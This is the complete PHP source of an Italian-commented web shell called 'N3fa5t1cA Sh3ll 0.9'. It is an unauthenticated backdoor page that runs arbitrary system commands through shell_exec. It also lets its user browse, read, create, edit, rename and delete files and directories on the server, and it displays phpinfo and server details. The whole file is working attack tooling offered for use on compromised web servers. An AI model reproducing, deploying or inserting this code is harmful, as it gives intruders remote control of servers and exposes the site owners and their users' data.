<?php error_reporting(0); ?>
<html><title>N3fa5t1cA Sh3ll</title>

<style>
A:visited {color: #00fff0;}
 A:active {color: #00ff00;}
input,textarea,select,table,body {

font: normal 11px Verdana, Arial, Helvetica, sans-serif;

background-color:black;

color:#a6a6a6;

border: solid 1px #464646;

}</style>



<body bgcolor="#000000" text="#ffffff" link="#00ff00" alink='#E1E1E1'>
<a href="<? echo $_SERVER['PHP_SELF'];?>"><center><h1>N3fa5t1cA Sh3ll</h1> 0.9 </center></a>
<center>realized by Dr. nefatso</center>
<br>PHP shell in          :     <?php echo $_SERVER['SCRIPT_FILENAME'] ?> <br />
Server          :    <?php echo $_SERVER['SERVER_NAME']; ?> <br />
USER agent           :    <?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']);?><br />
SERVER ADDR       :  <?php echo$_SERVER['SERVER_ADDR'];?><br />
CLIENT ADDR       :  <?php echo $_SERVER['REMOTE_ADDR'];?><br />



<center><?  $safe_mode_off="<font color=green>Safe Mode: OFF</font>";   $safe_mode_on="<font color=red>Safe Mode: 0N</font>";
(ini_get("safe_mode") == 0) ? $safe_status= $safe_mode_off : $safe_status= $safe_mod_on; echo $safe_status;

echo"<br />";   if (!get_magic_quotes_gpc())    echo "<font color=green>magic_quotes_gpc: OFF</font>";

         else   echo "<font color=red>magic_quotes_gpc: ON</font>";

?><br />

<a href="<? echo $_SERVER['PHP_SELF']."?phpinfo=1";?>">PHP_INFO</a></center><br />





<?php

$Wfile=$_GET["file"];                  //variabili che prendiamo attraverso GET..
$Wfiledit=$_GET["filedit"];               //le useremo dopo...
$Wrmdir=$_GET["rmdir"];
$Wfiletoedit=$_GET["filetoedit"];
$Wfileimage=$_GET["image"];
$Wfileremove=$_GET["fileremove"];
$Wphpinfo=$_GET["phpinfo"];   
($_GET["dir"]=="") ?  $dir= '.' : $dir= $_GET['dir'] ;



               /*questa parte si occupa di ricevere le informazioni per 
          *cambiare directory   
          *cercare file       
          *o creare un nuovo file   
          */

echo "<form action='".$_SERVER['PHP_SELF']."' method=POST><font color='#f6f6f6'>
directory</font>  :<input type='text' name='dir' value='".htmlspecialchars($dir)."' size=60><input type='submit' name='go_dir' value='go-->'><br/>

</form>



<form action='".$_SERVER['PHP_SELF']."?dir=".htmlspecialchars($dir)."' method=POST>

<font color='#f6f6f6'>..........MaKe FiLe...............</font><br />
nome file :<input type='text' name='name_new_file' value='' size=10>  ATTENZIONE METTERE ANKE L'URL SE SI VUOLE CREARE UN FILE IN UN ALTRA CARTELLA<br>
<textarea rows='2' cols='20' name='new_file_text'></textarea><input type='submit' name='new_file' value='genera'><br />



<font color='#f6f6f6'>.......ReNaMe.......</font><br />
<input type='text' name='old_name' value='old_name' size=60>
<input type='text' name='new_name' value='new_name' size=60>
<input type='submit' name='go_rename' value='rename ...'></form>


<font color='#f6f6f6'>.....ExEcTuTe</font><br>

<form action='".$_SERVER['PHP_SELF']."' method=POST>
esegui :<input type='text' name='cmd' value='' size=60><input type='submit' name='go_cmd' value='shell_exec'></form><hr />";







if ($Wphpinfo) phpinfo();





               //andiamo a eseguire dei comandi sulla shell..



elseif($_POST['go_cmd']) {

               $cmd_output=shell_exec($_POST['cmd']);

               echo "output di ".$_POST['cmd']."<br><hr><pre>".$cmd_output."</pre><hr><br>";

               }





         //rinominiamo un file



elseif($_POST['go_rename'])

   {

   echo "sto rinominando il file....";
   if (rename($_POST['old_name'],$_POST['new_name']))   echo "<br>file rinominato con successo..";   
   }
   
   
elseif ($Wfileremove!='' )
   {
   echo "rimozine file ".htmlspecialchars($Wfileremove); 
   ( unlink($Wfileremove) )  ? die( " riuscita") :            die( " fallita forse non hai i permessi di scrittura.....");     
   }
   

elseif($Wfileimage!='')            echo "<img src='".$Wfileimage."' />";            





elseif ($_POST['new_file'] )
   {
   $file = $_POST['name_new_file'];
   new_file($file,$_POST['new_file_text']);     
   }



                  //editiamo un file

elseif ($Wfiledit!='') {

         if (!(is_writable($Wfiledit) and is_readable($Wfiledit))) die("file non leggibbile e/o scrivibile");     
    $fldtp=fopen($Wfiledit,'r');   
    $testo = htmlspecialchars(fread($fldtp,filesize($Wfiledit)));
    fclose($fldtp);       
    echo "<center><form action='".$_SERVER['PHP_SELF']."?filetoedit=".$Wfiledit."' method=POST>     
    <textarea rows='50' cols='200' name='test'>".$testo."</textarea><br />       
    <input type='submit' name='save_edit_change' value='save'></form> ";         
    }//fine if di $Wfiledit

         
   elseif($Wfiletoedit and $_POST['save_edit_change'] ) {      
         $file_change_text=fopen ($Wfiletoedit,'w+');
         echo "salvataggio in ".htmlspecialchars($Wfiletoedit)."<br />";
         $testo_new=gpc_text($_POST['test'] );
         fwrite($file_change_text,$testo_new);
         fclose($file_change_text);   
         echo "salvataggio eseguito con successo....";
         }//fine di if







      // rimoviamo la dir

elseif($Wrmdir!=''){

            if (rmdir($Wrmdir))  echo $Wrmdir.' rimossa con successo' ;

            else echo $Wrmdir.' non sono riuscito a rimuoverla';

            }
            

            //stampiamo il testo del file

elseif ($Wfile!='' ){

      echo "sto aprendo <h3>".htmlspecialchars($Wfile)."</h3><hr /><br />"; 
      if (!is_readable($Wfile)) die("file non leggibbile");

   $flop = fopen($Wfile,'r');     
   $read=htmlspecialchars(fread($flop,filesize($Wfile)));
   fclose($flop);       
   echo "<pre><span>". $read."</span>      </pre><br /><hr />";
      lista_file($dir);}




elseif ($_POST['go_dir']) echo "sto aprendo  ".$_POST['dir']."<br>".lista_file($_POST['dir']);




else echo "<center>".lista_file($dir)."</center>";







function lista_file($dir)

         {

         if (!is_dir($dir)) die(htmlspecialchars($dir)." non è una directory");

         if ($handle = opendir($dir)) {

      $return =  '<TABLE BORDER="3"><tr><td>nome dato</td>

               <td>tipo dato</td>

               <td>view</td>

               <td>edit</td>

               <td>remove</td>

               <td>permessi</td>

               <td>maggiori informazioni</td>

               </tr>';

            while (false !== ($file = readdir($handle)))

       {// in questo while vengono richiamati tutti i file presenti nella cartella selezionata

               $return .= link_genera($file,$dir);//questo genera i vari link....

            }//fine while

       $return .= '</TABLE>';

      

        } else $return = 'non sono ruscito ad aprire la cartella ,...';        closedir($handle);        return $return ;

         }// fine function



         



function link_genera($a,$dir)

   {

       

   $image = array("jpg","gif",'png','JPG','GIF','PNG','jpeg','JPEG','bnp');

$re='<tr>';

$info = get_perms($dir.'/'.$a);

    if(is_dir($dir.'/'.$a)) $re.= "<TD><a href='".$_SERVER['PHP_SELF']."?dir=".$dir.'/'.$a."'>".htmlspecialchars($a).'</a></td><td>  directory</td><td></td><td></td><td><a href="'.$_SERVER['PHP_SELF'].'?rmdir='.$dir.'/'.$a.'">REMOVE</a></td>'  ;



   else {

   $re.="<td>".htmlspecialchars($a)."</td></td>";         
   
   if (in_array(file_get_type($dir.'/'.$a),$image))

       $re.=" <td><font color=red>immagine</font></td><td><a href='".$_SERVER["PHP_SELF"]."?image=".$dir.'/'.$a."'>VIEW</a></td> ";   

   else $re .= " <td>file</td><td><a href=' ".$_SERVER["PHP_SELF"]."?file=".$dir.'/'.$a."'>view</a></td>";   
   
   $re.=" <td><a href='".$_SERVER["PHP_SELF"]."?filedit=".$dir.'/'.$a."'>EDIT</a></td>     <td> <a href='".$_SERVER["PHP_SELF"]."?fileremove=".$dir.'/'.$a."'>REMOVE</a></td>";

      }
      $flsz= filesize($dir.'/'.$a);

      $re .= " <td>   ".$info."</td><td>dimensione ".$flsz."</td>";



$re.='</tr>';

   return $re;

   }



function get_perms($fn)

{

$perms=fileperms($fn);

 if($perms==false)  return false;

 $info='';





// Owner

$info .= (($perms & 0x0100) ? 'r' : '-');

$info .= (($perms & 0x0080) ? 'w' : '-');

$info .= (($perms & 0x0040) ?

            (($perms & 0x0800) ? 's' : 'x' ) :

            (($perms & 0x0800) ? 'S' : '-'));



// Group

$info .= (($perms & 0x0020) ? 'r' : '-');

$info .= (($perms & 0x0010) ? 'w' : '-');

$info .= (($perms & 0x0008) ?

            (($perms & 0x0400) ? 's' : 'x' ) :

            (($perms & 0x0400) ? 'S' : '-'));



// World

$info .= (($perms & 0x0004) ? 'r' : '-');

$info .= (($perms & 0x0002) ? 'w' : '-');

$info .= (($perms & 0x0001) ?

            (($perms & 0x0200) ? 't' : 'x' ) :

            (($perms & 0x0200) ? 'T' : '-'));





return $info;

}

function new_file($file,$text){

      $text = gpc_text($text);

                if (file_exists($file)) die ("file gia esistente se vuoi lo puoi modificare ma non scriverci sopra.....");

      echo "sto aprendo ".htmlspecialchars($file)."<br>";

                $nw_fl_pn=fopen($file,'w+');

                if ($nw_fl_pn==false) die ("non posso creare il nuovo file");

      echo "sto scrivendo su  ".htmlspecialchars($file)."<br>";

                fwrite($nw_fl_pn,$text);

                fclose($nw_fl_pn);

      echo "file creato ".htmlspecialchars($dir);

}

function file_get_type($file)

{

$array = explode ('.',$file);return ($array[(sizeof($array))-1]);}



function gpc_text($a){if(!get_magic_quotes_gpc())return $a;$a=str_replace("\'", "'",$a);$a=str_replace('\"', '"',$a);$a=str_replace ("\x5C\x5C","\x5C",$a);return $a;}



?></body></html> 